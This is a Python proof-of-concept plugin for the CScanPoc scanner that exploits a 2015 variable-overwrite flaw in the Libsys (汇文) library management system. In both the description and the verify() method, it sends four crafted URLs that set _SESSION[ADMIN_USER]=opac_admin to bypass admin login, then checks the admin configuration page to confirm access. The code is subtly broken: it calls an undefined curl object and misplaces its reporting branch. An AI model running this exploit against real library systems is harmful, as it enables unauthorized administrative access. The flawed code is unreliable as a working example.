# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import datetime


class Vuln(ABVuln):
    vuln_id = 'Libsys_0005'  # 平台漏洞编号，留空
    name = '汇文图书管理系统 变量覆盖'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-08-15'  # 漏洞公布时间
    desc = '''
        汇文（Libsys）图书管理系统存在变量覆盖漏洞。
        /recm/common.php?_SESSION[ADMIN_USER]=opac_admin
        /opac/openlink_ebk.php?_SESSION[ADMIN_USER]=opac_admin
        /opac/ajax_ebook.php?_SESSION[ADMIN_USER]=opac_admin
        /top/top_custom.php?_SESSION[ADMIN_USER]=opac_admin
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-90722'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '汇文软件'  # 漏洞应用名称
    product_version = 'V5.5'  # 漏洞应用版本


def testing(url):
    hh = hackhttp.hackhttp()
    code, head, res, errcode, _ = hh.http(url)
    if code == 200:
        return True
    else:
        return False


class Poc(ABPoc):
    poc_id = '6838fd1f-7e7a-4c8e-a236-eb740117e626'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            playload = (
                '/recm/common.php?_SESSION[ADMIN_USER]=opac_admin',
                '/opac/openlink_ebk.php?_SESSION[ADMIN_USER]=opac_admin',
                '/opac/ajax_ebook.php?_SESSION[ADMIN_USER]=opac_admin',
                '/top/top_custom.php?_SESSION[ADMIN_USER]=opac_admin'
            )

            code, head, res, errcode, _ = hh.http(
                self.target + '/admin/login.php')
            if code == 200 and 'opac_admin' in res:
                for p in playload:
                    if testing(self.target + p):
                        code, head, res, errcode, _ = curl.curl(
                            self.target + '/admin/cfg_basic.php')
                        if code == 200 and 'strSchoolName' in res:
                            log = '\nGood Luck, Login succeed'
                        else:
                            log = '\nLogin succeed, but sorry, it is an errot in setting-file.'
                            #security_hole(url + p+ log)
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))
                            return

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
